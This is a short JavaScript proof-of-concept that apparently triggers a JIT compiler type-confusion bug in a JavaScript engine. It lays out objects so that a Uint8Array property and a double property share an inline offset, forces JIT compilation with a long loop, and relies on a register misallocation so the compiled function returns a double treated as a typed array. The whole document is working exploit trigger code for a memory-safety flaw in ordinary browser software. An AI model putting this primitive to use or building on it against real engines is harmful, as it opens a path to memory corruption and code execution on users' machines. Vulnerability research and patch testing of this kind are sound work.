// Generate objects with inline properties
for (var i = 0; i < 100; i++)
 var o1 = {s: "asdf", x: new Uint8Array(0x20)};
for (var i = 0; i < 100; i++)
  var o2 = {s: "asdf", y: 13.37};

function f(a, b) {
  let p = b;
  for (; p.s < 0; p = p.s)
    while (p === p) {}
  for (var i = 0; i < 10000000; ++i) {} //JIT compilation

  /*
  This code will be compiled such that in the last statement, when the inline property
  x of a is accessed, it will actually access the inline property y of b due to the
  register misallocation and the fact that x and y are stored at the same offset in the
  objects
  */
  // JIT thinks it returns a Uint8Array, but actually returns a double
  return a.x;
}

f(o1, o2);
f(o1, o2);
res = f(o1,o2);
console.log(res[0]);